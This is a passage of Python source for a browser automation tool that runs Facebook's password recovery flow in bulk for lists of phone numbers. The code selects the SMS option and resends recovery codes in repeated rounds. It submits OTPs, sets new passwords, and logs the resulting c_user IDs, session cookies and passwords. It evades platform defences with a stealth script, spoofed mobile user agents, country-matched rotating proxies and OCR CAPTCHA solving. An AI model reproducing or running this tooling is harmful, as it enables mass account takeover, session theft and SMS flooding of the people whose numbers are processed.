                if cnt and cnt >= 1:
                    return
            except Exception:
                pass
            await asyncio.sleep(0.1)

    async def execute_recovery_task(self, index: int, total: int, item: Dict[str, Any]) -> Dict[str, Any]:
        task_start = time.time()
        phone = item.get("phone", "")
        otps = item.get("otps", [])
        raw_digits = re.sub(r"\D", "", phone)
        last2 = raw_digits[-2:] if len(raw_digits) >= 2 else ""

        record = {
            "index": index,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "action": self.action,
            "phone": phone,
            "otps": otps,
            "status": "FAILED",
            "c_user": "N/A",
            "password": self.password or "",
            "cookies": "",
            "time_taken": 0.0,
            "diagnostics": "Initialization"
        }

        task_title = "Account recovery" if self.action == "reset_account" else "Reset OTP"
        print(f"\n{task_title} on progress ")
        pending_cnt = max(0, total - self.processed_count)
        print(f"🪵 total accounts to process {total} processed {self.processed_count} pending {pending_cnt}")
        print_stage_log(total, index, f"Phone: {phone}")

        # Dry-run execution branch
        if self.dry_run:
            await asyncio.sleep(0.12)
            print_stage_log(total, index, "Navigating to identity recovery...")
            await asyncio.sleep(0.1)
            print_stage_log(total, index, f"Submitted search for {phone}")
            await asyncio.sleep(0.1)
            print_stage_log(total, index, "Encountered recovery options")
            await asyncio.sleep(0.1)
            print_stage_log(total, index, f"Found SMS radio (+******{last2})")
            await asyncio.sleep(0.1)
            print_stage_log(total, index, "Clicked Continue")
            await asyncio.sleep(0.1)
            print_stage_log(total, index, "otp input screen found")

            if self.action == "reset_otp":
                record["status"] = "RECO SMS SENT ✅"
                new_cnt = smart_update_reco_sms(phone, "RECO SMS SENT ✅")
                record["diagnostics"] = f"reco sms sent {new_cnt}x to ({phone})"
                print_stage_log(total, index, f"reco sms sent {new_cnt}x to ({phone})")
                if self.reco_rounds > 1:
                    for r_sim in range(2, self.reco_rounds + 1):
                        await asyncio.sleep(0.08)
                        print_stage_log(total, index, f"Found SMS radio (+******{last2})")
                        await asyncio.sleep(0.08)
                        print_stage_log(total, index, "Clicked Continue")
                        await asyncio.sleep(0.08)
                        print_stage_log(total, index, "otp input screen found")
                        new_cnt = smart_update_reco_sms(phone, "RECO SMS SENT ✅")
                        record["diagnostics"] = f"reco sms sent {new_cnt}x to ({phone})"
                        print_stage_log(total, index, f"reco sms sent {new_cnt}x to ({phone})")
            else:
                otp_to_use = otps[0] if otps else "699632"
                print_stage_log(total, index, f"Submitting OTP {otp_to_use} (attempt 1/{len(otps) or 1})")
                await asyncio.sleep(0.1)
                print_stage_log(total, index, "OTP accepted! Setting new password...")
                print_stage_log(total, index, "password input screen found")
                new_pwd = self.password or generate_strong_password(14)
                record["password"] = new_pwd
                print_stage_log(total, index, f"setting password: {new_pwd}")
                await asyncio.sleep(0.1)
                print_stage_log(total, index, "Found Save login info for later")
                print_stage_log(total, index, "clicked not now")
                record["c_user"] = f"615{random.randint(100000000, 999999999)}"
                record["cookies"] = f"datr=simulated_datr_{index}; c_user={record['c_user']}"
                record["status"] = "RECOVERY DONE ✅"
                record["diagnostics"] = "Password updated successfully; authenticated session verified."
                print_stage_log(total, index, f"Recovery successful! c_user: {record['c_user']} /phone {phone}")
                print_stage_log(total, index, f"password {new_pwd}")
                print_stage_log(total, index, "logged to file details are:")
                self._log_successful_recovery(record)
                render_account_card(record)

            record["time_taken"] = round(time.time() - task_start, 2)
            self.processed_count += 1
            if index < total:
                print("🫯🌌 next task on progress ☄️")
            return record

        # Live browser execution branch
        chrome_bin = get_chromium_binary()
        chromedriver_bin = get_chromedriver_binary()

        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.common.by import By
        from selenium.webdriver.common.keys import Keys

        driver = None
        temp_dir = None
        try:
            if self.mode == "ultra" and self.persistent_driver is not None:
                # Check if still responsive
                try:
                    _ = self.persistent_driver.current_url
                    driver = self.persistent_driver
                except Exception:
                    try: self.persistent_driver.quit()
                    except Exception: pass
                    self.persistent_driver = None
                    driver = None

            if driver is None:
                temp_dir = tempfile.mkdtemp(prefix="eydhm_reco_")
                options = Options()
                if chrome_bin: options.binary_location = chrome_bin
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-gpu")
                options.add_argument("--disable-software-rasterizer")
                options.add_argument("--no-zygote")
                options.add_argument("--disable-blink-features=AutomationControlled")
                options.add_argument("--disable-extensions")
                options.add_argument(f"--user-data-dir={temp_dir}")
                options.add_argument(f"user-agent={random.choice(MOBILE_UA)}")
                options.add_argument("--window-size=412,915")
                options.page_load_strategy = "eager" if self.mode in ("ultra", "fast") else "none"

                if self.mode in ("ultra", "instant"):
                    options.add_argument("--blink-settings=imagesEnabled=false")

                headless = True if (not os.environ.get("DISPLAY") and not os.environ.get("WAYLAND_DISPLAY")) else self.config.get("headless", False)
                if self.mode in ("ultra", "instant") or headless:
                    options.add_argument("--headless=new")

                # Initial Proxy configuration (Option rule 3: use from launch)
                routing_rule = SettingsManager.load().get("proxy_routing", {}).get("opt6" if self.action == "reset_otp" else "opt5", "disabled")
                proxy_to_use = None
                if routing_rule == "browser_launch":
                    proxy_to_use = self.proxy_mgr.get_random()
                elif routing_rule == "before_otp_country":
                    proxy_to_use = self.proxy_mgr.get_by_country(phone)
                elif self.config.get("proxy"):
                    proxy_to_use = self.proxy_mgr.get_current()

                if proxy_to_use:
                    options.add_argument(proxy_to_use["chrome_arg"])
                    write_runtime_log("PROXY", "LAUNCH", f"Launched browser with proxy: {proxy_to_use.get('raw')}")

                driver = await asyncio.to_thread(create_resilient_driver, options, headless)
                driver.set_page_load_timeout(35)

                try:
                    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {"source": EYDHMAutomationEngine.STEALTH_HOOK_JS})
                except Exception:
                    pass

                if self.mode == "ultra":
                    self.persistent_driver = driver
                    self.persistent_temp_dir = temp_dir
            else:
                # Ultra mode: wipe cookies and caches between tasks without killing Chromium
                try:
                    driver.delete_all_cookies()
                    driver.execute_script("try { window.localStorage.clear(); window.sessionStorage.clear(); } catch(e){}")
                    write_runtime_log("ULTRA", "SESSION", f"Ultra Mode: wiped cookies & storage in persistent browser for task {index}")
                except Exception:
                    pass

            # Step 1: Navigate to identity search
            write_runtime_log("INFO", "RECOVERY", f"Starting recovery task {index}/{total} for {phone} (Action: {self.action}) on {self.recovery_endpoint}")
            print_stage_log(total, index, "Navigating to identity recovery...")
            try:
                await self._safe_navigate(driver, self.recovery_endpoint)
            except Exception:
                pass
            await self._wait_for_dom_ready(driver)
            await asyncio.sleep(1.0 if self.mode != "ultra" else 0.5)
            write_runtime_log("NAVIGATE", "RECOVERY", f"Current URL: {get_safe_current_url(driver)} | Title: {driver.title if hasattr(driver, 'title') else ''}")

            curr_url = get_safe_current_url(driver).lower()
            if "identify" not in curr_url and "recover" not in curr_url:
                forgot_links = driver.find_elements(By.XPATH, "//a[contains(translate(., 'FORGOT', 'forgot'), 'forgot')] | //a[contains(translate(., 'FIND', 'find'), 'find')] | //a[contains(translate(., 'RECOVER', 'recover'), 'recover')]")
                if forgot_links:
                    write_runtime_log("ACTION", "RECOVERY", f"Engaging recovery link on landing: {forgot_links[0].text}")
                    driver.execute_script("arguments[0].click();", forgot_links[0])
                    await self._wait_for_dom_ready(driver)
                    await asyncio.sleep(1.0)

            # Dismiss any cookie banners, consent overlays, or interruptions before finding inputs
            for pop_sel in [
                "//button[contains(translate(., 'ALLOW', 'allow'), 'allow')]",
                "//button[contains(translate(., 'ACCEPT', 'accept'), 'accept')]",
                "//button[contains(translate(., 'DECLINE', 'decline'), 'decline')]",
                "//div[@aria-label='Decline optional cookies']",
                "//div[@aria-label='Allow all cookies']",
                "//button[contains(translate(., 'NOT NOW', 'not now'), 'not now')]",
                "//div[@role='button'][contains(translate(., 'NOT NOW', 'not now'), 'not now')]"
            ]:
                try:
                    for btn in driver.find_elements(By.XPATH, pop_sel):
                        if btn.is_displayed():
                            driver.execute_script("arguments[0].click();", btn)
                            await asyncio.sleep(0.2)
                except Exception:
                    pass

            # Step 2: Inject phone number with robust polling & displayed element filtering
            phone_inputs = []
            for _inp_poll in range(12):
                candidates = driver.find_elements(
                    By.CSS_SELECTOR,
                    "input#identify_search_text_input, input[name='email'], input[name='query'], "
                    "input[name='identify_email'], input[type='tel'], input[aria-label*='Mobile' i], "
                    "input[placeholder*='Mobile' i], input[aria-label*='Phone' i], input[placeholder*='Phone' i], "
                    "input[aria-label*='Search' i], input[placeholder*='Search' i], input[type='text']:not([type='hidden']), "
                    "input:not([type='hidden']):not([type='submit']):not([type='button']):not([type='radio']):not([type='checkbox']):not([type='password'])"
                )
                visible = [inp for inp in candidates if inp.is_displayed()]
                if visible:
                    phone_inputs = visible
                    break
                elif candidates:
                    phone_inputs = candidates
                    break
                await asyncio.sleep(0.3)

            if not phone_inputs and "limited" in self.recovery_endpoint:
                write_runtime_log("WARN", "RECOVERY", "Identify field not found on limited; attempting m.facebook.com/login/identify fallback...")
                try:
                    await self._safe_navigate(driver, "https://m.facebook.com/login/identify")
                    await asyncio.sleep(1.2)
                except Exception:
                    pass
                candidates = driver.find_elements(
                    By.CSS_SELECTOR,
                    "input#identify_search_text_input, input[name='email'], input[name='query'], "
                    "input[name='identify_email'], input[type='tel'], input[aria-label*='Mobile' i], "
                    "input[placeholder*='Mobile' i], input[aria-label*='Phone' i], input[placeholder*='Phone' i], "
                    "input[type='text']:not([type='hidden']), input:not([type='hidden']):not([type='submit']):not([type='button']):not([type='radio']):not([type='checkbox']):not([type='password'])"
                )
                visible = [inp for inp in candidates if inp.is_displayed()]
                phone_inputs = visible or candidates

            if not phone_inputs:
                record["status"] = "INPUT NOT FOUND ⚠️"
                record["diagnostics"] = "Could not locate mobile number input field on identify screen."
                write_runtime_log("ERROR", "RECOVERY", f"Mobile number input field missing on {get_safe_current_url(driver)}")
                self._log_invalid_reset(record)
                return record

            phone_field = phone_inputs[0]

            # Bring into view and focus
            try:
                driver.execute_script("arguments[0].scrollIntoView({behavior: 'instant', block: 'center'});", phone_field)
                await asyncio.sleep(0.15)
                driver.execute_script("arguments[0].focus();", phone_field)
            except Exception:
                pass

            try:
                phone_field.clear()
            except Exception:
                driver.execute_script("arguments[0].value = '';", phone_field)

            typed = False
            try:
                phone_field.send_keys(phone)
                typed = True
            except Exception as e:
                write_runtime_log("WARN", "RECOVERY", f"Direct send_keys failed ({e}); using JavaScript setter injection")

            # Verify value in DOM; inject via JS property setter & synthetic events if not matching
            val_in_dom = driver.execute_script("return arguments[0].value;", phone_field)
            if not typed or val_in_dom != phone:
                driver.execute_script("""
                    var el = arguments[0];
                    var val = arguments[1];
                    var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
                    if (setter) {
                        setter.call(el, val);
                    } else {
                        el.value = val;
                    }
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                """, phone_field, phone)
            else:
                driver.execute_script("""
                    var el = arguments[0];
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                """, phone_field)

            write_runtime_log("ACTION", "RECOVERY", f"Populated phone {phone} in identify field with verified DOM value.")

            # Submit search safely
            try:
                phone_field.send_keys(Keys.ENTER)
            except Exception:
                driver.execute_script("""
                    var el = arguments[0];
                    el.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }));
                    el.dispatchEvent(new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }));
                """, phone_field)

            search_btns = driver.find_elements(By.CSS_SELECTOR, "div[role='button'][aria-label='Continue'], div[role='button'], button[type='submit'], button[name='did_submit'], button, input[type='submit']")
            for b in search_btns:
                try:
                    t = (b.text or "").strip().lower()
                    aria = (b.get_attribute("aria-label") or "").strip().lower()
                    if t in ("continue", "search", "find", "search for your account", "next") or aria in ("continue", "search", "find", "next"):
                        driver.execute_script("arguments[0].click();", b)
                        write_runtime_log("ACTION", "RECOVERY", f"Clicked identify action button: {t or aria}")
                        break
                except Exception:
                    pass

            print_stage_log(total, index, f"Submitted search for {phone}")
            await asyncio.sleep(2.0 if self.mode != "ultra" else 1.2)

            # Step 3: Safe DOM Text & Error Extraction
            body_txt = ""
            for _b_try in range(4):
                try:
                    body_txt = get_safe_body_text(driver).strip()
                    if body_txt: break
                except Exception:
                    await asyncio.sleep(0.4)
            body_txt_lower = body_txt.lower()
            curr_url = get_safe_current_url(driver).lower()
            write_runtime_log("DOM", "RECOVERY", f"Post-search landing: {curr_url} | Snippet: {body_txt_lower[:140]}")

            # Specific Check 1: Account Not Found
            if any(k in body_txt_lower for k in [
                "isn't connected to an account",
                "not connected to an account",
                "couldn't find your account",
                "we couldn't find your account",
                "no search results",
                "doesn't match any account",
                "couldn't find an account",
                "create a new account with this mobile number",
                "we don't find any"
            ]):
                record["status"] = "ACCOUNT NOT FOUND ⚠️"
                diag_msg = f"It looks like {phone} isn't connected to an account."
                for bline in body_txt.splitlines():
                    bl_clean = bline.strip()
                    if any(w in bl_clean.lower() for w in ["connected to an account", "find your account", "doesn't match", "no search results"]):
                        diag_msg = bl_clean
                        break
                record["diagnostics"] = diag_msg
                print_stage_log(total, index, f"Account not found: {diag_msg}", emoji="⚠️")
                write_runtime_log("WARN", "RECOVERY", f"Account lookup returned no results for {phone}: {diag_msg}")
                self._log_invalid_reset(record)
                return record

            # Specific Check 2: Rate Limited / Temporarily Blocked
            if any(k in body_txt_lower for k in [
                "temporarily blocked",
                "you're temporarily blocked",
                "we limit how often",
                "misusing this feature",
                "try again later",
                "you've tried too many times",
                "please try again later"
            ]):
                record["status"] = "RATE LIMITED ⚠️"
                diag_msg = "Temporarily blocked: rate limit exceeded or feature restricted."
                for bline in body_txt.splitlines():
                    bl_clean = bline.strip()
                    if any(w in bl_clean.lower() for w in ["temporarily blocked", "limit how often", "misusing", "too fast", "try again"]):
                        diag_msg = bl_clean
                        break
                record["diagnostics"] = diag_msg
                print_stage_log(total, index, f"Rate limited: {diag_msg}", emoji="⚠️")
                write_runtime_log("WARN", "RECOVERY", f"Rate limit detected for {phone}: {diag_msg}")
                self._log_invalid_reset(record)
                return record

            # Specific Check 3: Checkpoint / Security Check
            if "checkpoint" in curr_url or any(k in body_txt_lower for k in ["security check", "confirm your identity", "help us confirm that you own this account"]):
                record["status"] = "CHECKPOINT ⚠️"
                record["diagnostics"] = "Account routed to security checkpoint / identity confirmation."
                print_stage_log(total, index, f"Checkpoint detected for {phone}", emoji="⚠️")
                write_runtime_log("WARN", "RECOVERY", f"Checkpoint detected for {phone}")
                self._log_invalid_reset(record)
                return record

            # Specific Check 4: CAPTCHA Challenge
            if "captcha" in body_txt_lower or "enter the letters" in body_txt_lower:
                print_stage_log(total, index, "CAPTCHA detected on recovery. Invoking MultiTierOCR...", emoji="WARN")
                write_runtime_log("WARN", "RECOVERY", "CAPTCHA challenge detected on recovery.")
                for _c_try in range(5):
                    c_imgs = driver.find_elements(By.CSS_SELECTOR, "img[src*='captcha'], img[id*='captcha']")
                    if c_imgs and c_imgs[0].is_displayed():
                        img_bytes = c_imgs[0].screenshot_as_png
                        c_text, _, _ = await MultiTierOCR.resolve(img_bytes)
                        if c_text:
                            c_inps = driver.find_elements(By.CSS_SELECTOR, "input[name*='captcha'], input[id*='captcha']")
                            if c_inps:
                                c_inps[0].clear()
                                c_inps[0].send_keys(c_text)
                                c_inps[0].submit()
                                await asyncio.sleep(1.8)
                                body_txt_post = get_safe_body_text(driver).lower()
                                if "captcha" not in body_txt_post:
                                    write_runtime_log("SUCCESS", "RECOVERY", "CAPTCHA challenge bypassed.")
                                    break

            # Specific Check 5: Direct landing on Enter Code Screen
            otp_inputs = driver.find_elements(By.CSS_SELECTOR, "input[name='n'], input[maxlength='6'], input[maxlength='8'], input[name='recovery_code'], input[name='code'], input[name='c'], input[type='number']")
            if any(i.is_displayed() for i in otp_inputs):
                write_runtime_log("INFO", "RECOVERY", "Direct landing on Enter Code barrier without radio selection.")
                print_stage_log(total, index, "otp input screen found")
            else:
                # Step 5a: Discover Recovery Options or Engage 'Try another way'
                # Check for existing radio options first
                radios = driver.find_elements(By.CSS_SELECTOR, "input[type='radio'], div[role='radio'], li[role='radio'], input[type='checkbox']")
                
                # If no radios or only password/whatsapp prompt, look for 'Try another way' (multilingual: IT, ES, FR, DE, EN)
                try_another_xpath = (
                    "//div[@role='button'][contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'try another') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'prova in un') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'prova con') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'probar de') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'essayer une') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'auf andere weise') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'tentar de outra') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'altre opzioni') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'otras opciones') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'other options') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'forgot') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'dimenticato') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'olvidado')]"
                    " | "
                    "//button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'try another') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'prova in un') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'prova con') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'probar de') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'essayer une') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'altre opzioni') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'otras opciones') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'other options') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'forgot') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'dimenticato') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'olvidado')]"
                    " | "
                    "//a[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'try another') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'prova in un') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'prova con') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'probar de') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'essayer une') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'altre opzioni') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'otras opciones') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'other options') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'forgot') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'dimenticato') or "
                    "contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'olvidado')]"
                    " | "
                    "//a[contains(@href, 'recover') or contains(@href, 'login/identify') or contains(@href, 'initiate')]"
                    " | "
                    "//*[@data-sigil and (contains(@data-sigil, 'try_another_way') or contains(@data-sigil, 'recover'))]"
                    " | "
                    "//button[@name='try_another_way' or @value='try_another_way']"
                )

                if not radios or len(radios) <= 1:
                    try_another_candidates = driver.find_elements(By.XPATH, try_another_xpath)
                    for ta in try_another_candidates:
                        try:
                            if ta.is_displayed():
                                ta_text = (ta.text or ta.get_attribute("aria-label") or ta.get_attribute("href") or "").strip()
                                print_stage_log(total, index, f"Engaging 'Try another way' ({ta_text[:30]})...")
                                write_runtime_log("ACTION", "RECOVERY", f"Clicking 'Try another way': {ta_text}")
                                driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].click();", ta)
                                await self._wait_for_dom_ready(driver)
                                await asyncio.sleep(2.0)
                                break
                        except Exception:
                            pass

                # Poll for radio candidates post-engagement
                for _rad_poll in range(12):
                    radios = driver.find_elements(By.CSS_SELECTOR, "input[type='radio'], div[role='radio'], li[role='radio'], input[type='checkbox']")
                    if radios:
                        break
                    await asyncio.sleep(0.3)

                write_runtime_log("DOM", "RECOVERY", f"Scanning {len(radios)} radio candidates for SMS...")
                selected_radio = None
                sms_candidates = []
                whatsapp_detected = False
                email_detected = False

                sms_keywords = [
                    "sms", "text", "phone", "mobile", "send_sms", "send_code_by_sms",
                    "messaggio", "cellulare", "telefono", "testo",  # Italian
                    "mensaje", "móvil", "celular", "enviar código",  # Spanish
                    "texto", "téléphone", "envoyer un code",  # French
                    "textnachricht", "handy"  # German
                ]

                for r in radios:
                    context_text = _extract_radio_context(driver, r)
                    write_runtime_log("DOM", "RADIO_SCAN", f"Radio context: {context_text[:120]}")

                    if "whatsapp" in context_text or "wa.me" in context_text:
                        whatsapp_detected = True
                        write_runtime_log("FILTER", "RADIO_SCAN", "Skipping WhatsApp option.")
                        continue

                    if "email" in context_text or "@" in context_text:
                        email_detected = True

                    has_last2 = bool(last2 and last2 in context_text)
                    has_sms_cue = any(w in context_text for w in sms_keywords)

                    if has_last2 and not email_detected and "whatsapp" not in context_text:
                        selected_radio = r
                        write_runtime_log("MATCH", "RADIO_SCAN", f"Selected SMS radio with ending digits match (+******{last2})")
                        break

                    if has_sms_cue:
                        sms_candidates.append((r, context_text))
                        if has_last2:
                            selected_radio = r
                            write_runtime_log("MATCH", "RADIO_SCAN", f"Selected SMS radio with keyword + ending digits match (+******{last2})")
                            break

                # If no exact last2 match, pick first valid non-WhatsApp SMS candidate
                if not selected_radio and sms_candidates:
                    selected_radio = sms_candidates[0][0]
                    write_runtime_log("MATCH", "RADIO_SCAN", f"Selected best SMS radio candidate: {sms_candidates[0][1][:60]}")

                if not selected_radio and len(radios) == 1:
                    single_ctx = _extract_radio_context(driver, radios[0])
                    if "whatsapp" not in single_ctx and "wa.me" not in single_ctx:
                        selected_radio = radios[0]
                        write_runtime_log("MATCH", "RADIO_SCAN", "Auto-selected sole available non-WhatsApp radio.")

                if not selected_radio:
                    # Direct SMS action buttons or links
                    sms_action_btns = driver.find_elements(
                        By.XPATH,
                        "//button[(contains(translate(., 'SMS', 'sms'), 'sms') or contains(translate(., 'MESSAGGIO', 'messaggio'), 'messaggio') or contains(translate(., 'MENSAJE', 'mensaje'), 'mensaje')) and not(contains(translate(., 'WHATSAPP', 'whatsapp'), 'whatsapp'))] | "
                        "//div[@role='button'][(contains(translate(., 'SMS', 'sms'), 'sms') or contains(translate(., 'MESSAGGIO', 'messaggio'), 'messaggio') or contains(translate(., 'MENSAJE', 'mensaje'), 'mensaje')) and not(contains(translate(., 'WHATSAPP', 'whatsapp'), 'whatsapp'))] | "
                        "//a[(contains(translate(., 'SMS', 'sms'), 'sms') or contains(translate(., 'MESSAGGIO', 'messaggio'), 'messaggio') or contains(translate(., 'MENSAJE', 'mensaje'), 'mensaje')) and not(contains(translate(., 'WHATSAPP', 'whatsapp'), 'whatsapp'))] | "
                        "//input[@type='submit'][(contains(translate(@value, 'SMS', 'sms'), 'sms') or contains(translate(@value, 'MESSAGGIO', 'messaggio'), 'messaggio') or contains(translate(@value, 'MENSAJE', 'mensaje'), 'mensaje')) and not(contains(translate(@value, 'WHATSAPP', 'whatsapp'), 'whatsapp'))]"
                    )
                    if sms_action_btns:
                        selected_radio = sms_action_btns[0]
                        write_runtime_log("MATCH", "BUTTON_SCAN", f"Matched direct SMS action button: {sms_action_btns[0].text or sms_action_btns[0].get_attribute('value')}")

                if selected_radio:
                    print_stage_log(total, index, f"Found SMS radio (+******{last2})")
                    write_runtime_log("ACTION", "RECOVERY", f"Selecting SMS recovery option for (+******{last2})")
                    driver.execute_script("try { arguments[0].checked = true; } catch(e){} arguments[0].click();", selected_radio)
                    r_id = selected_radio.get_attribute("id")
                    if r_id:
                        lbls = driver.find_elements(By.CSS_SELECTOR, f"label[for='{r_id}']")
                        if lbls:
                            driver.execute_script("arguments[0].click();", lbls[0])
                    await asyncio.sleep(0.8)

                    # Dynamic proxy rotation before clicking Continue (Routing Rule 1 or 2)
                    routing_rule = SettingsManager.load().get("proxy_routing", {}).get("opt6" if self.action == "reset_otp" else "opt5", "disabled")
                    if routing_rule in ("before_otp_random", "before_otp_country"):
                        p_swap = self.proxy_mgr.get_by_country(phone) if routing_rule == "before_otp_country" else self.proxy_mgr.get_random()
                        if p_swap:
                            write_runtime_log("PROXY", "STAGE_SWAP", f"Engaging proxy before OTP dispatch: {p_swap.get('raw')}")

                    # Click Continue (multilingual: EN, IT, ES, FR, DE, PT)
                    continue_xpath = (
                        "//div[@role='button'][@aria-label='Continue' or @aria-label='Continua' or @aria-label='Avanti' or @aria-label='Continuar' or @aria-label='Continuer' or @aria-label='Weiter'] | "
                        "//div[@role='button'][contains(translate(., 'CONTINUE', 'continue'), 'continue') or contains(translate(., 'CONTINUA', 'continua'), 'continua') or contains(translate(., 'AVANTI', 'avanti'), 'avanti') or contains(translate(., 'CONTINUAR', 'continuar'), 'continuar') or contains(translate(., 'NEXT', 'next'), 'next')] | "
                        "//button[@type='submit'] | "
                        "//button[contains(translate(., 'CONTINUE', 'continue'), 'continue') or contains(translate(., 'CONTINUA', 'continua'), 'continua') or contains(translate(., 'AVANTI', 'avanti'), 'avanti') or contains(translate(., 'CONTINUAR', 'continuar'), 'continuar') or contains(translate(., 'NEXT', 'next'), 'next')] | "
                        "//input[@type='submit'] | "
                        "//button[@name='reset_action'] | "
                        "//input[@name='reset_action']"
                    )
                    cont_btns = driver.find_elements(By.XPATH, continue_xpath)
                    if cont_btns:
                        target_btn = next((b for b in cont_btns if b.is_displayed()), cont_btns[0])
                        write_runtime_log("ACTION", "RECOVERY", f"Clicking Continue button: {target_btn.text or target_btn.get_attribute('value')}")
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].click();", target_btn)
                        print_stage_log(total, index, "Clicked Continue")
                        await self._wait_for_dom_ready(driver)
                        await asyncio.sleep(2.0)
                else:
                    otp_check = driver.find_elements(By.CSS_SELECTOR, "input[name='n'], input[maxlength='6'], input[maxlength='8'], input[name='recovery_code'], input[name='code'], input[type='number']")
                    if not otp_check:
                        body_now = get_safe_body_text(driver).lower()
                        if whatsapp_detected or "whatsapp" in body_now:
                            record["status"] = "ONLY WHATSAPP ⚠️"
                            record["diagnostics"] = "Only WhatsApp recovery option available (no SMS radio for this account)."
                            print_stage_log(total, index, "Only WhatsApp recovery option available. Skipping...", emoji="⚠️")
                        elif email_detected or "send email" in body_now or "code via email" in body_now:
                            record["status"] = "ONLY EMAIL ⚠️"
                            record["diagnostics"] = "Only Email recovery option available (no SMS radio for this account)."
                            print_stage_log(total, index, "Only Email recovery option available. Skipping...", emoji="⚠️")
                        elif "password" in body_now and len(radios) == 0:
                            record["status"] = "PASSWORD ONLY ⚠️"
                            record["diagnostics"] = "Only password login available; no recovery methods presented."
                            print_stage_log(total, index, "Only password login available. Skipping...", emoji="⚠️")
                        else:
                            record["status"] = "SMS OPTION UNAVAILABLE ⚠️"
                            record["diagnostics"] = f"No matching SMS recovery radio found for phone ending in {last2}."
